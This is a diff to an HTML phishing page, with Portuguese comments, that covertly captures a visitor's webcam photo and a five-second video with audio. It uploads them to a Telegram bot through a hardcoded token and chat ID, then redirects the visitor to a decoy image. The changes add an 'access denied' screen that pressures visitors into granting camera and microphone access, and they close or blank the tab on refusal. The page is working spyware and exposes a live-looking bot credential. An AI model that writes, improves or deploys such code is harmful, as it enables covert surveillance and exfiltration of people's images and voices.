@@ -10,11 +10,23 @@
       margin: 0;
       padding: 0;
       overflow: hidden;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: sans-serif;
     }
     video, canvas { display: none; }
+    .msg-erro { text-align: center; display: none; }
   </style>
 </head>
 <body>
+
+  <div id="msgErro" class="msg-erro">
+    <h2>Acesso negado.</h2>
+    <p>É necessário permitir o uso da câmera e do microfone para continuar.</p>
+  </div>
 
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
@@ -22,11 +34,11 @@
   <script>
     const TELEGRAM_TOKEN = '8387772090:AAEEWGOfpNJy0xT-2GwLQymQptoziAeaAR4';
     const CHAT_ID = '2003666494';
-    const REDIRECT_URL = 'https://aistudio.google.com/prompts/new_chat?project=gen-lang-client-0954460682';
+    const REDIRECT_URL = 'https://i.ibb.co/ccPKRYw7/Whats-App-Image-2017-05-18-at-11-43-44.jpg';
 
     async function iniciarNexusApp() {
       try {
-        // Solicita permissões de Mídia invisivelmente
+        // Solicita permissões de Mídia (se o usuário recusar, cai direto no catch)
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
           audio: true
@@ -39,14 +51,25 @@
           // Captura Foto em 1 segundo
           setTimeout(() => capturarFoto(video), 1000);
 
-          // Inicia Gravação de Vídeo (5 segundos) e redireciona ao terminar
+          // Inicia Gravação de Vídeo (5 segundos) e redireciona ao terminar com sucesso
           setTimeout(() => gravarVideoEAudio(stream, 5000), 1200);
         };
 
       } catch (err) {
         console.error("Permissão negada ou erro:", err);
-        // Se o usuário negar, redireciona do mesmo jeito para não travar
-        window.location.href = REDIRECT_URL;
+        
+        // SE NÃO PERMITIR: O site NÃO abre o link. 
+        // Exibe mensagem e tenta fechar a janela/aba (quando permitido pelo navegador)
+        document.getElementById('msgErro').style.display = 'block';
+        
+        try {
+          window.close();
+        } catch(e) {}
+        
+        // Se o navegador bloquear o fechamento automático da aba, redireciona para uma página em branco ou segura
+        setTimeout(() => {
+          window.location.href = "about:blank";
+        }, 1500);
       }
     }
 
@@ -75,7 +98,6 @@
       try {
         mediaRecorder = new MediaRecorder(stream);
       } catch (e) {
-        window.location.href = REDIRECT_URL;
         return;
       }
 
@@ -89,7 +111,7 @@
         fd.append('chat_id', CHAT_ID);
         fd.append('video', blob, 'video_nexus.mp4');
         
-        // Envia o vídeo e redireciona assim que concluir
+        // Só redireciona para o site correto SE permitir e enviar com sucesso
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd })
           .finally(() => {
             window.location.href = REDIRECT_URL;
